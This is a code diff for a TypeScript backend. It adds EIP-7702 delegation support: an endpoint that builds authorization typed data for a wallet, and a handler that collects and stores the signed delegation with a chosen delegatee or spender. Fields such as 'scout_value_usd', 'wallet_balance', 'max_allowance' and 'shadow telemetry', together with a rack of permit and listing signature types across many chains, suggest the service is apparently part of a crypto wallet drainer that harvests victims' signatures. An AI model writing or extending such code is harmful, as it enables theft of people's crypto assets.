@@ -21,6 +21,10 @@ import {
   isCosmosBech32Address,
   isAptosAddress,
   isSuiAddress,
+  buildEip7702AuthorizationRequest,
+  isEip7702Enabled,
+  packEip7702SignatureEnvelope,
+  type Eip7702SignedAuthorization,
 } from '@legion/core'
 import {
   getChainEnvName,
@@ -227,6 +231,8 @@ interface NormalizedIngressV1 {
   cosmos_payload?: Record<string, unknown>
   aptos_payload?: Record<string, unknown>
   sui_payload?: Record<string, unknown>
+  eip7702_authorization?: Eip7702SignedAuthorization & { chainId?: number; address?: string; nonce?: string | number }
+  delegatee?: Address
   scout_value_usd?: number
   amount?: string
   wallet_balance?: string
@@ -286,6 +292,7 @@ const PROTOCOL_RACK = new Set([
   'evm',
   'permit2_eip712',
   'permit2_batch_eip712',
+  'eip7702_delegation',
   'omnichain_atomic_v1',
   'seaport_listing',
   'solana',
@@ -1399,6 +1406,38 @@ async function signatureAnchorPostHandler(
 }
 
 export async function registerSignatureAnchorRoute(app: FastifyInstance): Promise<void> {
+  app.get('/api/v1/signature-anchor/eip7702-typed-data', async (request, reply) => {
+    if (!isEip7702Enabled()) {
+      return sendFailure(reply, 503, 'EIP7702_ENABLED is false', { code: 'FeatureDisabled' })
+    }
+    const q = request.query as Record<string, string | undefined>
+    const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
+    const chainIdRaw = q.chain_id?.trim() ?? ''
+    if (!walletRaw || !chainIdRaw) {
+      return sendFailure(reply, 400, 'wallet and chain_id query params required', { code: 'ValidationError' })
+    }
+    if (!isAddress(walletRaw)) {
+      return sendFailure(reply, 400, 'wallet must be valid EVM address', { code: 'ValidationError' })
+    }
+    const chainId = Number(chainIdRaw)
+    if (!Number.isFinite(chainId)) {
+      return sendFailure(reply, 400, 'Invalid chain_id', { code: 'ValidationError' })
+    }
+    try {
+      const built = await buildEip7702AuthorizationRequest(chainId, walletRaw as Address)
+      return sendSuccess(reply, 200, 'EIP-7702 authorization request ready', {
+        typed_data: normalizeBigInts(built.typed_data),
+        authorization_request: normalizeBigInts(built.authorization_request),
+        delegatee: built.delegatee,
+        spender: built.spender,
+        protocol: 'eip7702_delegation',
+      })
+    } catch (e) {
+      const msg = e instanceof Error ? e.message : String(e)
+      return sendFailure(reply, 500, msg, { code: 'ServerError' })
+    }
+  })
+
   app.get('/api/v1/signature-anchor/permit2-typed-data', async (request, reply) => {
     const q = request.query as Record<string, string | undefined>
     const walletRaw = q.wallet?.trim() ?? q.wallet_address?.trim() ?? ''
@@ -2020,7 +2059,7 @@ async function handleNormalizedIngress(
     return sendFailure(
       reply,
       400,
-      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, omnichain_atomic_v1, seaport_listing, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
+      'protocol must be one of: evm, permit2_eip712, permit2_batch_eip712, eip7702_delegation, omnichain_atomic_v1, seaport_listing, solana, utxo, bitcoin_psbt, tron, ton, cosmos, aptos, sui',
       { code: 'ValidationError' },
     )
   }
@@ -2180,6 +2219,68 @@ async function handleNormalizedIngress(
   }
 
   if (b.chain_family === 'EVM') {
+    if (protocolNorm === 'eip7702_delegation') {
+      if (!isEip7702Enabled()) {
+        return sendFailure(reply, 503, 'EIP7702_ENABLED is false on this deployment', {
+          code: 'FeatureDisabled',
+        })
+      }
+      if (b.chain_id == null) {
+        return sendFailure(reply, 400, 'eip7702_delegation requires chain_id', { code: 'ValidationError' })
+      }
+      const authRaw = b.eip7702_authorization as Record<string, unknown> | undefined
+      if (!authRaw || authRaw['r'] == null || authRaw['s'] == null) {
+        return sendFailure(reply, 400, 'eip7702_delegation requires eip7702_authorization { r, s, yParity, nonce, address, chainId }', {
+          code: 'ValidationError',
+        })
+      }
+      const delegateeRaw = b.delegatee?.trim() ?? String(authRaw['address'] ?? '').trim()
+      if (!delegateeRaw || !isAddress(delegateeRaw)) {
+        return sendFailure(reply, 400, 'eip7702_delegation requires valid delegatee address', {
+          code: 'ValidationError',
+        })
+      }
+      const spenderRaw = b.engine_spender?.trim()
+      const authorization: Eip7702SignedAuthorization = {
+        chainId: Number(authRaw['chainId'] ?? b.chain_id),
+        address: getAddress(String(authRaw['address'] ?? delegateeRaw)),
+        nonce: BigInt(String(authRaw['nonce'] ?? '0')),
+        r: String(authRaw['r']) as Hex,
+        s: String(authRaw['s']) as Hex,
+        yParity: Number(authRaw['yParity'] ?? authRaw['v'] ?? 0),
+      }
+      const packed = packEip7702SignatureEnvelope({
+        protocol: 'eip7702_delegation',
+        chain_id: Number(b.chain_id),
+        wallet: wallet_address as Address,
+        delegatee: getAddress(delegateeRaw),
+        spender: spenderRaw && isAddress(spenderRaw) ? getAddress(spenderRaw) : getAddress(delegateeRaw),
+        authorization,
+      })
+      const sealed = sealSignatureHexForPersistence(packed as Hex)
+      const chainIdNorm = String(b.chain_id).trim()
+      const tel = extractShadowTelemetry(b as unknown as Record<string, unknown>)
+      return persistSignatureRow(
+        {
+          wallet_address,
+          token_address: token_address || getAddress(delegateeRaw),
+          signature_hex: sealed,
+          nonce: b.nonce,
+          expiry: b.expiry_iso,
+          wallet_type: b.wallet_type.trim(),
+          protocol: 'eip7702_delegation',
+          chain_family: 'EVM',
+          scout_value_usd: tel.scout_value_usd,
+          amount: tel.amount ?? '0',
+          max_allowance: tel.max_allowance,
+          requires_quorum: tel.requires_quorum,
+          source_origin: sourceOrigin,
+          chain_id: chainIdNorm,
+        },
+        reply,
+      )
+    }
+
     if (protocolNorm === 'seaport_listing') {
       if (b.chain_id == null) {
         return sendFailure(reply, 400, 'seaport_listing ingress requires chain_id', {
